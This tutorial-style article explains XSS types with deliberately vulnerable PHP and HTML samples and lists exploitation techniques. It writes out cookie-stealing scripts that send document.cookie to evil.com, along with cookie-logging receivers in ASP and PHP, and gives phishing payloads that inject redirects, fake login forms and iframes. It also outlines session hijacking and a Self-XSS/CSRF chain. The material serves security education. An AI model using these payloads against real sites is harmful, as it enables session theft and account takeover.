# XSS

## Introduction to XSS

Cross-Site Scripting (XSS) is a common computer security vulnerability in web applications, caused by insufficient input filtering of user input. Attackers exploit website vulnerabilities to inject malicious script code into web pages. When other users browse these pages, the malicious code is executed, potentially leading to various attacks against victims such as cookie theft, session hijacking, phishing, and more.

### Reflected XSS

Reflected Cross-Site Scripting is the most common and widely used type, where malicious scripts can be attached to URL parameters.

In a reflected XSS attack, the attacker uses specific techniques (such as email) to lure users into visiting a URL containing malicious code. When the victim clicks on these specially crafted links, the malicious code executes directly in the victim's browser. This type of XSS typically appears in website search bars, login pages, etc., and is commonly used to steal client-side cookies or perform phishing attacks.

Server-side code:

```php
<?php 
// Is there any input? 
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) { 
    // Feedback for end user 
    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>'; 
} 
?>
```

As we can see, the code directly references the `name` parameter without any filtering or validation, presenting an obvious XSS vulnerability.

### Persistent XSS

Persistent Cross-Site Scripting is also known as Stored Cross-Site Scripting.

This type of XSS does not require users to click on a specific URL to execute cross-site scripts. The attacker uploads or stores malicious code to the vulnerable server in advance, and any victim who browses a page containing this malicious code will have it executed. Persistent XSS typically appears in interactive areas such as website guestbooks, comments, and blog entries, where malicious scripts are stored in the client-side or server-side database.

Server-side code:

```php
<?php
  if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );
    // Sanitize message input
    $message = stripslashes( $message );
    $message = mysql_real_escape_string( $message );
    // Sanitize name input
    $name = mysql_real_escape_string( $name );
    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' );
    //mysql_close(); }
?>
```

The code only removes or escapes some whitespace characters, special characters, and backslashes, without performing XSS filtering and validation. Since data is stored in the database, it clearly has a stored XSS vulnerability.

### DOM XSS

Traditional XSS vulnerabilities typically appear in server-side code, while DOM-Based XSS is a vulnerability based on the DOM (Document Object Model), and is therefore affected by client-side browser scripting code. Client-side JavaScript can access the browser's DOM text object model, and therefore can determine the URL used to load the current page. In other words, client-side scripts can dynamically inspect and modify page content through the DOM without depending on server-side data, instead obtaining data from the DOM (such as extracting data from the URL) and executing it locally. On the other hand, browser users can manipulate some objects in the DOM, such as URL, location, etc. If user input on the client side contains malicious JavaScript scripts and these scripts are not properly filtered and sanitized, the application may be susceptible to DOM-based XSS attacks.

HTML code:

```html
<html>
  <head>
    <title>DOM-XSS test</title>
  </head>
  <body>
    <script>
      var a=document.URL;
      document.write(a.substring(a.indexOf("a=")+2,a.length));
    </script>
  </body>
</html>
```

Save the code as domXSS.html and access it in a browser:

```
http://127.0.0.1/domXSS.html?a=<script>alert('XSS')</script>
```

This will trigger the XSS vulnerability.

## XSS Exploitation Techniques

### Cookie Theft

Attackers can use the following code to obtain client-side cookie information:

```html
<script>
document.location="http://www.evil.com/cookie.asp?cookie="+document.cookie
new Image().src="http://www.evil.com/cookie.asp?cookie="+document.cookie
</script>
<img src="http://www.evil.com/cookie.asp?cookie="+document.cookie></img>
```

On the remote server, there is a file that receives and records cookie information, examples as follows:

```asp
<%
  msg=Request.ServerVariables("QUERY_STRING")
  testfile=Server.MapPath("cookie.txt")
  set fs=server.CreateObject("Scripting.filesystemobject")
  set thisfile=fs.OpenTextFile(testfile,8,True,0)
  thisfile.Writeline(""&msg& "")
  thisfile.close
  set fs=nothing
%>
```

```php
<?php
$cookie = $_GET['cookie'];
$log = fopen("cookie.txt", "a");
fwrite($log, $cookie . "\n");
fclose($log);
?>
```

After obtaining the cookies, the attacker can modify the local browser's cookies to log into the victim's account.

### Session Hijacking

Due to certain security flaws in using cookies, developers have started using more secure authentication methods, such as sessions. In the session mechanism, the client and server use identifiers to recognize user identity and maintain sessions, but these identifiers can also potentially be exploited by others. The essence of session hijacking is that the attack carries cookies and sends them to the server.

For example, if a CMS comment system has a stored XSS vulnerability, the attacker writes XSS code into comment messages. When the administrator logs into the backend and views the comments, the XSS vulnerability is triggered. Since the XSS is triggered in the backend, the target of the attack is the administrator. By injecting JavaScript code, the attacker can hijack the administrator's session to perform certain operations, thereby achieving privilege escalation.

For instance, if an attacker wants to use XSS to add an administrator account, they only need to capture the HTTP request information for adding an administrator account through prior code auditing or other means, then use an XMLHTTP object to send an HTTP request in the background. Since the request carries the victim's cookies and sends them to the server together, the operation of adding an administrator account can be achieved.

### Phishing

-   Redirect Phishing

    Redirect the current page to a phishing page.

    ```
    http://www.bug.com/index.php?search="'><script>document.location.href="http://www.evil.com"</script>
    ```

-   HTML Injection Phishing

    Use XSS vulnerabilities to inject HTML or JavaScript code into the page.

    ```
    http://www.bug.com/index.php?search="'<html><head><title>login</title></head><body><div style="text-align:center;"><form Method="POST" Action="phishing.php" Name="form"><br /><br />Login:<br/><input name="login" /><br />Password:<br/><input name="Password" type="password" /><br/><br/><input name="Valid" value="Ok" type="submit" /><br/></form></div></body></html>
    ```

This code embeds a form into the legitimate page.

-   iframe Phishing

    This method uses the `<iframe>` tag to embed a page from a remote domain for phishing.

    ```
    http://www.bug.com/index.php?search='><iframe src="http://www.evil.com" height="100%" width="100%"</iframe>
    ```

-   Flash Phishing

    Upload a crafted Flash file to the server and reference it on the target website using `<object>` or `<embed>` tags.

-   Advanced Phishing Techniques

    Inject code to hijack HTML forms, write keyboard loggers using JavaScript, etc.

### Drive-by Downloads

Generally achieved by tampering with web pages, such as using `<iframe>` tags in XSS.

### DOS and DDOS

Injecting malicious JavaScript code may cause denial-of-service attacks.

### XSS Worms

Through carefully crafted XSS code, various functions such as unauthorized transfers, information tampering, article deletion, and self-replication can be achieved.

## Self-XSS: Turning Useless into Useful Scenarios

Self-XSS, as the name suggests, is an XSS vulnerability point that can only be triggered by the attacker themselves — essentially attacking yourself. For example, a personal privacy input field has an XSS vulnerability, but since this private information can only be viewed by the user themselves, it cannot be used to attack others. This type of vulnerability usually has low impact and seems somewhat useless. However, in certain specific scenarios, when combined with other vulnerabilities (such as CSRF), Self-XSS can be transformed into a harmful vulnerability. Below are some common scenarios where Self-XSS can be exploited.

- Login/logout has CSRF, personal information has Self-XSS, third-party login

  The typical exploitation flow for this scenario is: first, the attacker injects a payload at the personal information XSS point, then the attacker creates a malicious page to lure the victim into visiting it. The malicious page performs the following operations:

  1. The malicious page uses CSRF to log the victim into the attacker's personal information page, triggering the XSS payload
  2. The JavaScript payload generates an `<iframe>` tag and executes the following operations within the frame
  3. Log the victim out of the attacker's account
  4. Then use CSRF to log the victim into their own account's personal information page
  5. The attacker extracts the CSRF Token from the page
  6. Then the CSRF Token can be used to submit modifications to the user's personal information

  Several points need attention in this attack flow: the login in step three does not require user interaction, using non-password login methods such as Google Sign In; **X-Frame-Options** needs to be set to same-origin (the page can be displayed in an `iframe` on pages from the same domain)

- Login has CSRF, account information has Self-XSS, OAUTH authentication

  1. Log the user out of the account page, but not out of the OAUTH authorization page, to ensure the user can re-login to their account page
  2. Log the user into our account page where the XSS appears, using `<iframe>` tags etc. to execute malicious code
  3. Log back into their respective accounts, but our XSS has already stolen the Session
